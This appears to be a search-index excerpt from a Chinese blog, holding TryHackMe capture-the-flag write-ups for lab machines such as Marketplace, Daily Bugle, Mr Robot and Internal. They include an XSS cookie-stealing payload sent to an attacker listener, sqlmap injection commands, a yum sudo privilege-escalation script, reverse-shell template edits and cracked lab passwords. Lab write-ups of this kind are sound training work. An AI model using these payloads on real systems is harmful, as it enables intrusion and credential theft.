    "title": "THM the Marketplace","content": " 靶机ip：10.10.113.205\n信息收集 nmap扫描 nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205\n发现有22，80，32768端口开放\n80端口 先扫描目录\ngobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt\n先创建一个普通用户查看一下相关路径，得到以下结果：\n/admin 需要登录认证才能查看 /signup 注册 /login 登录 /new 创建一个新列表 /messages 查看消息 /contact/michael 联系列表作者 /item/1 查看具体列表的详细信息 /report/1 向管理员报告列表 XSS钓鱼越权 测试后发现在创建新列表的时候，Description的值存在存储型xss\n\u0026amp;lt;script\u0026amp;gt;alert(1)\u0026amp;lt;/script\u0026amp;gt;\n可以利用xss得到cookie等关键信息\n\u0026amp;lt;script\u0026amp;gt;alert(document.cookie)\u0026amp;lt;/script\u0026amp;gt;\n发现cookie的格式像是jwt，可以使用在线工具查看一下\n想尝试将cookie伪造成admin，但是失败了\n我们的商品存在存储型XSS漏洞，那么我们可以在我们的商品页面作为钓鱼页面，举报自己的商品诱导管理员审核，然后得到管理员的Cookie，提取他的Token\n首先，建立监听用于获取cookie python -m http.server\n然后构造XSS钓鱼页面，当有人访问的时候获取他的cookie \u0026amp;lt;img src=x onerror=this.src=\u0026amp;#34;http://10.14.90.122:8000/?1=\u0026amp;#34;+document.cookie\u0026amp;gt; \u0026amp;lt;img\u0026amp;gt; 用于加载图像。\nsrc=x 设置一个无效的图像源，通常会导致加载失败。\nonerror 当图像加载失败时触发的事件。\nthis.src 在图像加载失败时，将图像的 src 属性设置为一个 URL，即为我们构造的一个新的URL将当前页面的 cookies 作为查询参数添加到该 URL 中\ndocument.cookie 获取当前页面的 cookies\n这时我们会收到大量的cookie， …","date": "2024-10-17 15:31:23",
    "updated": "2025-11-11 13:39:59"
  }, 
  {
    "objectID": "621d224af2babf0000191d95b9b9d5899a68a4f4",
    "permalink": "/post/thm-mustacchio/",
    "title": "THM Mustacchio","content": " 靶机ip：10.10.235.246\n信息收集 nmap扫描 nmap -T4 -A -sV -sC -p- 10.10.235.246\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining) Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining) Nmap scan report for 10.10.235.246 Host is up (0.30s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA) | 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA) |_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | http-robots.txt: 1 disallowed entry |_/ …","date": "2024-10-15 14:59:34",
    "updated": "2025-11-11 12:22:18"
  }, 
  {
    "objectID": "9890c4f86d52507f8a63407780b0f8d81945aba1",
    "permalink": "/post/thm-steel-mountain/",
    "title": "THM Steel Mountain","content": " 靶机ip：10.10.51.252\n写在前面 注意：机器不响应ping命令\n信息收集 nmap扫描 nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252\n开放若干端口，但是可以看出这是一台windows主机\n80端口 一个普通的页面，扫下目录\ngobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt\n没什么有用信息\n查看下源码\n找到人名BillHarper\nSMB smbclient -L //10.10.51.252\n不允许匿名登录\n8080端口 发现是一个文件服务器版本号是2.3，点进去看看\n到这里就知道这个服务器的名字了Rejetto HTTP File Server\n可以尝试去网上找找是否有历史漏洞\n找到个CVE-2014-6287\n获取初始访问权限 启动msf\n直接搜索这个cve并使用\n把必要的参数设置一下\n直接run！\n获得基础用户权限\n在C:\\Users\\bill\\Desktop找到user.txt\n提升至root权限 这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用PowerUp的PowerShell脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置\n将文件保存到本地，通过msf传上去\n可以通过meterpreter会话来加载PowerShell扩展，并进入 PowerShell的shell界面并执行脚本\nload powershell powershell_shell Import-Module .\\PowerUp.ps1 Invoke-AllChecks 发现有个特别的服务CanRestart选项被设置为true，当这个选项为true时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行\nServiceName ：AdvancedSystemCareService9\nModifiablePath：C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe …","date": "2024-10-14 16:27:58",
    "updated": "2025-11-11 12:18:23"
  }, 
  {
    "objectID": "d068b222de142dab224fceeaba0fc8cc1929377d",
    "permalink": "/post/thm-retro/",
    "title": "THM Retro","content": " 靶机ip：10.10.52.12\n写在前面 注意：机器不响应ping命令\n信息收集 nmap扫描 nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12\n这里使用-Pn参数绕过ping命令的检查\n发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机\n80端口 是一个windows server默认的IIS服务\n扫描一下目录\ngobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n访问一下/retro\n在页面最下面发现文章Ready Player One\n根据文章意思猜测这是一组登录凭据Wade : parzival\nRDP登录远程主机 拿到一组用户凭据，结合之前的3389端口开放，尝试登录\nxfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12\n登陆成功\n并在桌面找到user.txt\nWindows提权 先进行windows主机信息搜集\n桌面上有个浏览器，查看一下\n发现该用户收藏了一个cve的页面，查看一下\n是CVE-2019-1388\n我们发现目标机的浏览器中有CVE-2019-1388的历史访问记录\u0026amp;ndash;猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在CVE-2019-1388漏洞\n经过信息搜索可知CVE-2019-1388是一个UAC提权漏洞，该漏洞的基本信息如下：\nUAC:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。\nCVE-2019-1388：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT …","date": "2024-10-12 11:46:11",
    "updated": "2025-11-11 12:12:40"
  }, 
  {
    "objectID": "15fc04f523686c99058d7b30cc66d72ecd16ba94",
    "permalink": "/post/thm-mr-robot-ctf/",
    "title": "THM Mr Robot CTF","content": " 靶机ip：10.10.202.26\n信息收集 nmap扫描 nmap --min-rate 10000 -sS -sV -sC 10.10.202.26\n发现22，80等端口，但是ssh服务关闭了\n80端口 默认页面是一个类似于linux终端的界面，正常的命令执行不了，只能执行页面提供的命令\n每个命令都测试了一下，并没有什么她特别重要的信息，先扫描一下目录\ngobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt\n结果很多，但是可以看出来这是一个wordpress的站\n后台getshell 先查看一下哎robots.txt\n找到第一个key\n另一个文件fsocity.dic访问后自动下载了\n打开后是个字典\n接着访问扫描出来的结果时，发现在/license文件下有信息\n很像base64编码，解码试试\n得到一个用户名密码：elliot:ER28-0652\n尝试登陆wordpress\n没想到这是个admn用户，赚翻啦\n直接kali监听一手\n将准备好的php-reverse-shell.php写在404.php上\n设置好ip和port后保存\n浏览器访问http://10.10.202.26/theme/twentyfifteen/404.php\n拿到初始权限\n提升至user权限 切换交互式shell\npython -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n/home下有robot用户，进入之后发现第二个key，但是我们查看不了，我们能查看另一个文件，根据其内容可以判断出这是robot的用户名和密码\n将密码保存到文件hash中，用hashcat离线破解试试\nhashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt\n破解成功，拿到robot用户的明文密码abcdefghijklmnopqrstuvwxyz\n拿到第二个key\n提升至root权限 先尝试sudo -l\nok，不让用\n用find查一下特权命令\nfind / -perm -u=s -type f 2\u0026gt; /dev/null\n发现有nmap，可以利用nmap提权\n提权成功\n在/root目录下找到最后一个key\n","date": "2024-10-09 20:04:27",
    "updated": "2025-11-11 12:00:47"
  }, 
  {
    "objectID": "8d343498d6a09b304fdb610075d87c9d59428d28",
    "permalink": "/post/thm-daily-bugle/",
    "title": "THM Daily Bugle","content": " 靶机ip：10.10.158.159\n信息收集 nmap扫描 nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap\n发现有22，80，3306端口开放，并且在80端口上有robots.txt，开启了mysql服务\n80端口 页面貌似没什么信息，扫描一下目录\ngobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt\n先看下robots.txt\n综上来看这是一个joomla CMS，目录访问后并没有发现什么信息\nSQL漏洞利用 使用joomscan测试一下\njoomscan -u http://10.10.158.159/\n发现版本是3.7.0，搜索一下是否有可以利用的漏洞\nsearchsploit joomla 3.7.0\n发现在该版本存在sql注入，将文件复制下来查看\n这里写了使用sqlmap工具进行sql注入，直接照着弄就行\nsqlmap -u \u0026quot;http://10.10.158.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]\n利用成功，得到数据库，继续爆破表\nsqlmap -u \u0026quot;http://10.10.158.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]\n得到很多表，我们重点看users表，先查看字段的值\nsqlmap -u \u0026quot;http://10.10.158.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' --columns -p list[fullordering]\n选项直接正常选就行\n漫长等待后也是把字段爆破出来了，我们重点看用户名和密码\nsqlmap -u \u0026quot;http://10.10.158.159/index.php?option=com_fields\u0026amp;view=fields\u0026amp;layout=modal\u0026amp;list[fullordering]=updatexml\u0026quot; --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C username,password --dump -p list[fullordering]\n成功拿到了一组凭据\njonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\n密码是加密数据，这里使用john破解，先将密码保存至hash\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt\n得到jonah用户的明文密码spiderman123\n登录joomla\n登陆成功\n获得初始权限 查看后发现可以通过改写模板文件的内容getshell\n首先点击右侧Template\n再点击右侧的Template\n选第一个Beez3\n为了方便反弹shell，直接修改index.php文件\n将php-reverse-shell.php写到文件中，并修改其中的ip和port\n保存，在kali中起个监听\n在页面中访问刚才修改的文件\nhttp://10.10.158.159/templates/beez3/index.php\ngetshell成功！\n现在只有一个初始访问权限，还需要横向移动到jjameson用户\n提升至user权限 先查看文件\n在查看文件的时候发现在 /var/www/html目录下有个configuration.php文件，查看一下\n发现有密码nv5uz9r3ZEDzVjNu，貌似是root用户的，ssh登录一下\n看样子不是root的密码，尝试ssh登陆jjameson\n登陆成功\n直接在当前页面找到user.txt\n提升至root权限 先执行sudo -l看看是否有可利用的\n可以使用yum提权\nTF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y 提权成功\n在/root目录下找到root.txt\n","date": "2024-10-08 13:23:31",
    "updated": "2025-11-11 11:17:29"
  }, 
  {
    "objectID": "e1986e487a7d8468a7fbd5979619d36729eb5745",
    "permalink": "/post/thm-boiler-ctf/",
    "title": "THM Boiler CTF","content": " 靶机ip：10.10.20.169\n信息收集 nmap扫描 nmap --min-rate 10000 -p- -sV -sC 10.10.20.169 -oN reports/namp\n发现开放21，80，10000，55007端口，55007端口运行着ssh服务\n21端口 根据nmap的结果发现ftp可以匿名登录\nftp anonymous@10.10.20.169\n发现隐藏文件.info.txt，get下来查看\n内容像是被rot13加密过的，尝试解密\n解密后发现是一个提示性的文字，告诉我们需要枚举\n80端口 默认页面是一个apache的初始页面\n先扫描一下目录\ngobuster dir -u http://10.10.20.169/ -w /usr/share/wordlists/dirb/common.txt\n发现很多有意思的目录，查看一下\nrobots.txt 给的目录并没有内容返回都是404，重点看下面的一串数据\n解密后得到另一串数据99b0660cd95adea327c54182baa51584\n看起来像md5数据，使用hashcat解密\nhashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt\n解出来的数据是kidding，现在看来没什么用\nmanual 是一个apache的文档，可以知道的是版本号是2.4\njoomla 这是一个cms\n获取初始shell 刚才知道了是joomla系统，继续深入扫描一下目录\ngobuster dir -u http://10.10.20.169/joomla -w /usr/share/wordlists/dirb/common.txt\n这次目录有点多\n测试后发现只有几个有内容\n最重要的是这个，在/joomla/_test目录下发现有sar2html\n使用searchsploit搜索一下相关漏洞\n用的是第一个，复制到当前目录\n查看内容后发现是在url处控制plot参数，通过值拼接实现RCE，利用一下\n命令执行成功\n查看一下log.txt\n发现basterd用户使用密码 superduperp@$$通过ssh连接机器，我们之前扫描结果中ssh端口发现是55007\n我们使用这个凭据尝试连接\nssh basterd@10.10.20.169 -p 55007\n连接成功，拿到basterd用户的shell\n横向移动 在/home/basterd目录发现backup.sh文件\n查看后发现另一个用户stoner，以及密码superduperp@$$no1knows，直接登录stoner用户\n登陆成功\n在/home/stoner目录下找到隐藏文件.secret，其内容就是user.txt\n权限提升 并没有什么可以利用的\n使用find看看能否有提权的机会\nfind / -perm -u=s -type f 2\u0026gt; /dev/null\n发现有find，利用find命令提权\n提权成功\n同样在/root目录下获取到root.txt\n","date": "2024-10-07 15:17:47",
    "updated": "2025-11-11 10:58:45"
  }, 
  {
    "objectID": "ecea59fc0178d7613c42452ed31ba618ed7d9ac9",
    "permalink": "/post/thm-internal/",
    "title": "THM Internal","content": " 靶机ip：10.10.27.141\n写在前面 要将internal.thm添加到/etc/hosts 文件中\n信息收集 nmap扫描 nmap --min-rate 10000 -sS -sV -sC 10.10.27.141 -oN reports/nmap\n发现开放22端口和80端口\n80端口 是一个apache的初始页面，扫描一下目录\ngobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt\n访问一下\n/blog /javascript /phpmyadmin /wordpress 不难看出，这是一个wordpress的界面，wordpress和blog是一个页面，这里以/blog为主，同时还有个phpMyAdmin\n获取初始shell 登录wordpress 先看下phpMyAdmin\n查看源码发现版本号是4.6.6，通过searchsploit搜索后发现没有什么可以利用的，将注意力转移到wordpress\n使用wpscan扫描一下\nwpscan --url http://internal.thm/blog/ -e\n发现有个admin账户，尝试破解一下密码\nwpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt\n爆破成功，找到了admin账户的密码my2boys 成功登录\nshell获取 在这里发现可以随意更改文件内容。这里将404.php内容改成反弹shell的文件是php-reverse-shell，修改ip和port\n点击下买你的更新文件。然后在kali上创建监听\n现在需要找到404.php文件的位置，从路由中可以看到主题是twentyseventeen，而且大多数主题位于wp-content 目录下，主题位于/wp-content/themes目录下，所以404.php文件的位置是：/wp-content/themes/twentyseventeen/404.php\n访问文件http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php\n这样我们就拿到了低权用户的shell\n先 …","date": "2024-10-07 12:37:32",
    "updated": "2025-11-11 11:06:59"
  }, 
  {
    "objectID": "a58329350e81e8d0363f0ecd1020df6cddc35209",
    "permalink": "/post/thm-gamingserver/",
    "title": "THM GamingServer","content": " 靶机ip：10.10.121.5\n信息收集 nmap扫描 nmap --min-rate 10000 -sS -sV -sC 10.10.121.5\n只开放了22和80端口\n80端口 ![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)\n非常炫酷的界面\n浏览之后发现在http://10.10.121.5/about.html# 下，有个upload按钮，点击一下\n这时候发现就跳转到了可以浏览目录的页面\n在dict.lst中是一个字典\n将其下载到本地，留着以后可能用得上\nmanifesto.txt内容如下，是一封信\n得到一个用户名Mentor\n现在我们有了一个用户名和一个密码字典，之前端口探测的时候，发现22端口是开放的，我们可以尝试通过爆破ssh密码尝试登录\n获取普通权限 很可惜，没有破解成功，继续尝试扫描一下目录\ngobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt\n发现有几个特别的信息，查看一下\nrobots.txt里的信息并不太重要，因为我们之前点击upload访问过这个目录\n这个/secret目录是个新目录，之前没有找到，查看一下secretKey文件\n发现这是RSA私钥文件，下载下来保存为id_rsa并赋予600权限，爆破加密私钥的密码\n先将id_rsa转换为hash格式\nssh2john id_rsa \u0026amp;gt; rsa_hash\n使用john开始爆破\njohn rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt\n使用john rsa_hash --show查看结果\n找到密码letmein，使用ssh私钥登录\nssh Mentor@10.10.121.5 -i id_rsa\n登陆后还是失败了，肯定是之前有哪些信息没有注意到\n在首页源码处发现另一个用户john，使用这个用户尝试登录\nssh john@10.10.121.5 -i id_rsa\n登陆成功，看来之前的那封信只是一封信而已\n直接在当前目录找到user.txt\n权限提升 sudo -l由于缺少密码利用不了， …","date": "2024-10-06 13:28:31",
    "updated": "2025-11-11 10:54:33"
  }, 
  {
    "objectID": "c1f8c4aec9c6b3d7b7aafe6d25c0cce64bf2004a",
    "permalink": "/post/thm-startup/",
    "title": "THM Startup","content": " 靶机ip：10.10.45.30\n信息收集 nmap扫描 nmap -sS -sV -sC 10.10.45.30\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2) mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for 10.10.45.30 Host is up (0.28s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.11.101.220 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain …","date": "2024-10-01 19:35:50",
    "updated": "2025-11-11 10:46:32"
  }, 
  {
    "objectID": "f01bee197ede5f83c71cf7d44382c88c4655502e",
    "permalink": "/post/thm-lazyadmin/",
    "title": "THM LazyAdmin","content": " 靶机ip：10.10.36.50\n信息收集 nmap扫描 nmap -sS -sV -sC 10.10.36.50 -o out.txt\n# Nmap 7.94SVN scan initiated Tue Oct 1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50 Nmap scan report for 10.10.36.50 Host is up (0.34s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA) | 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA) |_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds 发现只有 22端口和80端口开放\n80端口 80端口是一个apache初 …","date": "2024-10-01 13:21:11",
    "updated": "2025-11-11 10:41:44"
  }, 
  {
    "objectID": "bd090ecb8915841287ffad08cc863006a43fbab2",
    "permalink": "/post/thm-bolt/",
    "title": "THM Bolt","content": " 靶机ip：10.10.48.19\n信息收集 nmap扫描 nmap -sS -sV -sC 10.10.48.19\n# Nmap 7.94SVN scan initiated Tue Oct 1 10:13:36 2024 as: nmap -sS -sV -sC -o out.txt 10.10.48.19 Nmap scan report for 10.10.48.19 Host is up (0.37s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA) | 256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA) |_ 256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) 8000/tcp open http (PHP 7.2.32-1) |_http-title: Bolt | A hero is unleashed |_http-generator: Bolt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Not Found | Date: Tue, 01 Oct 2024 02:14:09 GMT | Connection: close | X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1 | Cache-Control: private, must-revalidate | Date: Tue, 01 Oct 2024 02:14:09 GMT | Content-Type: text/html; charset=UTF-8 | pragma: no-cache | expires: -1 | X-Debug-Token: 5d427e | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Bolt | A hero is unleashed\u0026lt;/title\u0026gt; | \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/theme/base-2018/css/bulma.css?8ca0842ebb\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/theme/base-2018/css/theme.css?6cb66bfe9f\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;Bolt\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | href=\u0026#34;#main-content\u0026#34; class=\u0026#34;vis | GetRequest: | HTTP/1.0 200 OK | Date: Tue, 01 Oct 2024 02:14:09 GMT | Connection: close | X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1 | Cache-Control: public, s-maxage=600 | Date: Tue, 01 Oct 2024 02:14:09 GMT | Content-Type: text/html; charset=UTF-8 | X-Debug-Token: cc4424 | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=\u0026#34;en-GB\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Bolt | A hero is unleashed\u0026lt;/title\u0026gt; | \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/theme/base-2018/css/bulma.css?8ca0842ebb\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/theme/base-2018/css/theme.css?6cb66bfe9f\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;Bolt\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;canonical\u0026#34; href=\u0026#34;http://0.0.0.0:8000/\u0026#34;\u0026gt; | \u0026lt;/head\u0026gt; |_ \u0026lt;body class=\u0026#34;front\u0026#34;\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.94SVN%I=7%D=10/1%Time=66FB5AEF%P=x86_64-pc-linux-gnu%r SF:(GetRequest,29E1,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2001\\x20Oct\\ SF:x202024\\x2002:14:09\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20 SF:PHP/7\\.2\\.32-1\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x2 SF:0public,\\x20s-maxage=600\\r\\nDate:\\x20Tue,\\x2001\\x20Oct\\x202024\\x2002:14 SF::09\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nX-Debug-T SF:oken:\\x20cc4424\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en-GB\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset= SF:\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\ SF:x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Bolt\\x20\\|\\x SF:20A\\x20hero\\x20is\\x20unleashed\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\u0026lt;link\\x20href=\\\u0026#34;https://fonts\\.googleapis\\.com/css\\?family=Bitter\\|Rob SF:oto:400,400i,700\\\u0026#34;\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/bulma\\.c SF:ss\\?8ca0842ebb\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;style SF:sheet\\\u0026#34;\\x20href=\\\u0026#34;/theme/base-2018/css/theme\\.css\\?6cb66bfe9f\\\u0026#34;\u0026gt;\\n\\x20\\ SF:x20\\x20\\x20\\t\u0026lt;meta\\x20name=\\\u0026#34;generator\\\u0026#34;\\x20content=\\\u0026#34;Bolt\\\u0026#34;\u0026gt;\\n\\x20\\x20 SF:\\x20\\x20\\t\u0026lt;link\\x20rel=\\\u0026#34;canonical\\\u0026#34;\\x20href=\\\u0026#34;http://0\\.0\\.0\\.0:8000/\\ SF:\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\\x20class=\\\u0026#34;front\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;a\\x20\u0026#34;)%r(FourOhFourRequest,1527,\u0026#34;HTT SF:P/1\\.0\\x20404\\x20Not\\x20Found\\r\\nDate:\\x20Tue,\\x2001\\x20Oct\\x202024\\x20 SF:02:14:09\\x20GMT\\r\\nConnection:\\x20close\\r\\nX-Powered-By:\\x20PHP/7\\.2\\.3 SF:2-1\\+ubuntu18\\.04\\.1\\+deb\\.sury\\.org\\+1\\r\\nCache-Control:\\x20private,\\x SF:20must-revalidate\\r\\nDate:\\x20Tue,\\x2001\\x20Oct\\x202024\\x2002:14:09\\x20 SF:GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\npragma:\\x20no-ca SF:che\\r\\nexpires:\\x20-1\\r\\nX-Debug-Token:\\x205d427e\\r\\n\\r\\n\u0026lt;!doctype\\x20h 